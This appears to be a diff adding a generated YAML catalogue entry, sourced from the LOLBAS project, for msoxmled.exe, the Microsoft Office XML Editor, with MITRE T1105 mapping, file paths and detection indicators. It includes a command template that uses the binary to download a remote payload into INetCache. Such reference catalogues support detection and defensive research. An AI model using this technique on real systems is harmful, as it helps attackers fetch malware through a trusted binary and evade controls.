@@ -1,0 +1,93 @@
+id: lolbas/T1NCaW5hcmllcy9Nc294bWxlZC55bWw/RG93bmxvYWQ/0
+type: binary
+platform: windows
+name: msoxmled.exe
+phases:
+- command-and-control
+capabilities:
+- file-download
+privilege_required: user
+sources:
+- project: LOLBAS
+  upstream_url: https://lolbas-project.github.io
+  license: GPL-3.0
+  upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+  last_synced: '2026-11-13'
+attack_techniques:
+- T1105
+opsec:
+  noise: high
+  triggers: '`msoxmled.exe` making network connections to external URLs'
+commands:
+- template: msoxmled.exe /verb open {REMOTEURL}
+  comment: Downloads payload from remote server using the Microsoft Office XML Editor.
+references:
+- https://lolbas-project.github.io/lolbas/Binaries/Msoxmled/
+tags:
+- windows
+- lolbas
+source_data:
+  LOLBAS:
+    raw:
+      name: msoxmled.exe
+      category: Download
+      privileges: User
+      mitre_id: T1105
+      source_file: OSBinaries/Msoxmled.yml
+      command_source_index: 0
+      document_utf8: "---\nName: msoxmled.exe\nDescription: Microsoft Office XML Editor, used to handle\
+        \ XML documents in Microsoft Office.\nAuthor: Bogac Kaya\nCreated: 2025-08-22\nCommands:\n  -\
+        \ Command: msoxmled.exe /verb open {REMOTEURL}\n    Description: Downloads payload from remote\
+        \ server using the Microsoft Office XML Editor.\n    Usecase: It will download a remote payload\
+        \ and place it in INetCache.\n    Category: Download\n    Privileges: User\n    MitreID: T1105\n\
+        \    OperatingSystem: Windows 10, Windows 11\n    Tags:\n      - Download: INetCache\nFull_Path:\n\
+        \  - Path: C:\\Program Files\\Microsoft Office\\root\\vfs\\ProgramFilesCommonX64\\Microsoft Shared\\\
+        Office16\\msoxmled.exe\n  - Path: C:\\Program Files (x86)\\Common Files\\Microsoft Shared\\OFFICE14\\\
+        msoxmled.exe\nDetection:\n  - IOC: \"`msoxmled.exe` making network connections to external URLs\"\
+        \n  - IOC: Unexpected file downloads initiated by `msoxmled.exe`\n  - IOC: \"Event ID 1 with Image:\
+        \ `msoxmled.exe` and CommandLine: `/verb open`\"\nResources:\n  - Link: https://learn.microsoft.com/en-us/answers/questions/4805030/where-is-msoxmled-exe-for-office-professional-2013\n\
+        Acknowledgement:\n  - Person: Bogac Kaya\n    Handle: '@bogackayaa'\n  - Person: Furkan Celik\n\
+        \    Handle: '@frknclk034'\n"
+      document_sha256: sha256:bdd83f17e58f5f0df9f1b78c89ece338e8b9f4bb95b1389614c2a64e8e1e67bb
+    upstream_url: https://lolbas-project.github.io/lolbas/Binaries/Msoxmled/
+    upstream_version: 2056cb7662509dc998fc6ce79636aec4e6c0397f
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: file-download
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  phases:
+  - value: command-and-control
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  attack_techniques:
+  - value: T1105
+    provenance:
+      type: upstream
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+  privilege_required:
+    value: user
+    provenance:
+      type: adapter
+      source: LOLBAS
+      adapter: lolbas@2056cb7662509dc998fc6ce79636aec4e6c0397f
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    LOLBAS: sha256:06330de7681f4e5668f7a0822a239cdd34e3ab31ec5242d58571c4db7c3cf3ab
